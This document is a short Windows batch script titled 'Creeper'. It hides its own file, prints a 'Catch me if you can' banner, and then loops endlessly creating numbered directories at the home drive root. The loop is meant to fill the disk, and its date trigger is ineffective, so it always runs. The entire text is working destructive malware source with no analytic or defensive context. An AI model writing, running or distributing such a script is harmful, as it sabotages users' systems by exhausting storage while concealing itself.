@echo off
attrib +h Creeper.bat
IF %date% == 9/11/2005 goto creeper
:creeper
echo --------------------------------------------
echo                   CREEPER
echo             Catch me if you can
echo --------------------------------------------
goto explode
:explode
CD %homedrive%\
SET Creeper=1
GOTO killdisk1
:killdisk1
MKDIR Creeper%Creeper%
SET /a Creeper=%Creeper%+1
GOTO killdisk1